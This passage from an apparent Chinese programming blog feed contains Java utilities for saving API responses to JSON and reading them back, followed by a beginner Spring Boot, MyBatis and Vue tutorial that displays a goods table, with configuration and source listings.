class="comment">  * <span class="doctag">@Description</span>:调用API接口并将参数和返回结果等封装成DTO保存到指定路径</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@Param</span>: [method, url, params, filePath]</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@Return</span>: boolean</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@author</span>: Nan-ZN.Xu@qq.com</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@date</span>: 6/8/2021</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@Time</span>: 2:18 PM</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">requestAndSave</span><span class="params">(String method, String url, Map&lt;String, String&gt; params, String filePath)</span> &#123;</span><br><span class="line">     <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">     ApiRequest apiRequest;<span class="comment">//详见另一篇博客（HttpClient的使用）的封装</span></span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         apiRequest = request(method, url, params);<span class="comment">//详见另一篇博客（HttpClient的使用）的封装</span></span><br><span class="line">     &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">//获取接口名</span></span><br><span class="line">     String[] urlStrings = url.split(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">     <span class="type">String</span> <span class="variable">interfaceName</span> <span class="operator">=</span> urlStrings[urlStrings.length - <span class="number">1</span>];</span><br><span class="line">     <span class="comment">//获取当前时间</span></span><br><span class="line">     <span class="type">Date</span> <span class="variable">date</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">     <span class="type">SimpleDateFormat</span> <span class="variable">formatter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyyMMddHHmmss&quot;</span>);</span><br><span class="line">     <span class="type">String</span> <span class="variable">dataTime</span> <span class="operator">=</span> formatter.format(date);</span><br><span class="line">     <span class="comment">//设置文件保存路径以及文件名</span></span><br><span class="line">     filePath = filePath + <span class="string">&quot;\\&quot;</span> + interfaceName + <span class="string">&quot;-&quot;</span> + dataTime + <span class="string">&quot;.json&quot;</span>;</span><br><span class="line"></span><br><span class="line">     FileOutputStream fileOutputStream;</span><br><span class="line">     OutputStreamWriter outputStreamWriter;</span><br><span class="line">     <span class="type">BufferedWriter</span> <span class="variable">bufferedWriter</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filePath);</span><br><span class="line">         <span class="keyword">if</span> (!file.getParentFile().exists()) &#123;</span><br><span class="line">             flag = file.getParentFile().mkdirs();</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">if</span> (file.exists()) &#123;</span><br><span class="line">             flag = file.delete();</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="comment">//利用JsonTool工具(上文)将DTO对象转为json格式输出到文本</span></span><br><span class="line">         <span class="type">String</span> <span class="variable">ojString</span> <span class="operator">=</span> JSONObject.toJSONString(apiRequest);</span><br><span class="line">         <span class="type">JsonTool</span> <span class="variable">tool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JsonTool</span>();</span><br><span class="line">         <span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> tool.stringToJSON(ojString);</span><br><span class="line"></span><br><span class="line">         <span class="comment">//利用流写入文件</span></span><br><span class="line">         fileOutputStream = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">         outputStreamWriter = <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(fileOutputStream, CHARSET);</span><br><span class="line">         bufferedWriter = <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(outputStreamWriter);</span><br><span class="line"></span><br><span class="line">         bufferedWriter.write(text);</span><br><span class="line">     &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">         flag = <span class="literal">false</span>;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">     &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">         <span class="comment">//关闭资源</span></span><br><span class="line">         <span class="keyword">if</span> (bufferedWriter != <span class="literal">null</span>) &#123;</span><br><span class="line">             <span class="keyword">try</span> &#123;</span><br><span class="line">                 bufferedWriter.flush();</span><br><span class="line">                 bufferedWriter.close();</span><br><span class="line">             &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                 e.printStackTrace();</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> flag;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h1 id="从JSON文件中读取json并转换成DTO"><a href="#从JSON文件中读取json并转换成DTO" class="headerlink" title="从JSON文件中读取json并转换成DTO"></a>从JSON文件中读取json并转换成DTO</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Description</span>:从JSON文件中读取json并转换成DTO对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Param</span>: [filePath]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Return</span>: qq.cn.oeServiceCommon.dto.ApiRequest</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span>: Nan-ZN.Xu@qq.com</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@date</span>: 6/8/2021</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Time</span>: 5:28 PM</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ApiRequest <span class="title function_">readFromJsonFile</span><span class="params">(String filePath)</span> &#123;</span><br><span class="line">        ApiRequest apiRequest;<span class="comment">//详见另一篇博客（HttpClient的使用）的封装</span></span><br><span class="line"></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filePath);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonStr</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        FileInputStream fis;</span><br><span class="line">        <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fis = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">            bis = <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(fis);</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> ch;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            <span class="keyword">while</span> ((ch = bis.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">                str.append((<span class="type">char</span>) ch);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            jsonStr = str.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (bis != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    bis.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//将JSON文本串转为对象</span></span><br><span class="line">        apiRequest = JSONArray.parseObject(jsonStr, ApiRequest.class);</span><br><span class="line">        <span class="keyword">return</span> apiRequest;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="将请求结果封装成指定DTO"><a href="#将请求结果封装成指定DTO" class="headerlink" title="将请求结果封装成指定DTO"></a>将请求结果封装成指定DTO</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">getResultDto</span><span class="params">(String method, String url, Map&lt;String, String&gt; params, Class&lt;T&gt; clazz)</span> &#123;</span><br><span class="line">    ApiRequest apiRequest;<span class="comment">//详见另一篇博客（HttpClient的使用）的封装</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        apiRequest = request(method, url, params);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> apiRequest.getResult();</span><br><span class="line">    <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(result);</span><br><span class="line">    <span class="keyword">return</span> JSONObject.parseObject(jsonString, clazz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> JavaWeb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HandlerInterceptor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot整合Vue的小案例</title>
      <link href="/posts/bccf/"/>
      <url>/posts/bccf/</url>
      
        <content type="html"><![CDATA[<p>众所周知现在开发都是前后端分离，后端选用Spring Boot，前端选用Vue技术。</p><p>由于刚学完Vue.js，所以想了解下现在主流的前后端分离是如何实现的，所以写了个小demo。</p><h1 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h1><p>需求：将数据库的goods表展示到前端页面。</p><p>所用技术：</p><ul><li>SpringBoot</li><li>MyBatis</li><li>Vue.js</li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201118090102.png"></p><h1 id="SpringBoot"><a href="#SpringBoot" class="headerlink" title="SpringBoot"></a>SpringBoot</h1><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201118090504.png"></p><h2 id="基础项目配置"><a href="#基础项目配置" class="headerlink" title="基础项目配置"></a>基础项目配置</h2><h3 id="Pom-xml"><a href="#Pom-xml" class="headerlink" title="Pom.xml"></a>Pom.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>top.nanzx<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>bootvue<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>bootvue<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Demo project for Spring Boot<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="application-yml"><a href="#application-yml" class="headerlink" title="application.yml"></a>application.yml</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/keshe?serverTimezone=UTC&amp;characterEncoding=utf-8</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="attr">configuration:</span></span><br><span class="line">    <span class="attr">map-underscore-to-camel-case:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8181</span></span><br></pre></td></tr></table></figure><h2 id="编写实体类"><a href="#编写实体类" class="headerlink" title="编写实体类"></a>编写实体类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.bootvue.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Good</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String intro;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编写dao层"><a href="#编写dao层" class="headerlink" title="编写dao层"></a>编写dao层</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.bootvue.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Mapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Select;</span><br><span class="line"><span class="keyword">import</span> top.nanzx.bootvue.entity.Good;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">GoodsMapper</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Select(&quot;select id, name, intro from goods&quot;)</span></span><br><span class="line">    List&lt;Good&gt; <span class="title function_">getAllGoods</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编写controller层"><a href="#编写controller层" class="headerlink" title="编写controller层"></a>编写controller层</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.bootvue.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> top.nanzx.bootvue.dao.GoodsMapper;</span><br><span class="line"><span class="keyword">import</span> top.nanzx.bootvue.entity.Good;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GoodsController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> GoodsMapper goodsMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/getAllGoods&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Good&gt; <span class="title function_">getAllGoods</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> goodsMapper.getAllGoods();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Vue-js"><a href="#Vue-js" class="headerlink" title="Vue.js"></a>Vue.js</h1><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201118091714.png"></p><h2 id="封装网络请求模块"><a href="#封装网络请求模块" class="headerlink" title="封装网络请求模块"></a>封装网络请求模块</h2><p>在network&#x2F;request.js中：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">request</span>(<span class="params">config</span>) &#123;</span><br><span class="line">  <span class="comment">// 创建axios的实例</span></span><br><span class="line">  <span class="keyword">const</span> instance = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">    <span class="attr">timeout</span>: <span class="number">5000</span></span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="comment">// 发送真正的网络请求</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">instance</span>(config)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编写视图"><a href="#编写视图" class="headerlink" title="编写视图"></a>编写视图</h2><p>在views&#x2F;Goods.vue中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Id<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>商品名称<span class="tag">&lt;/<span 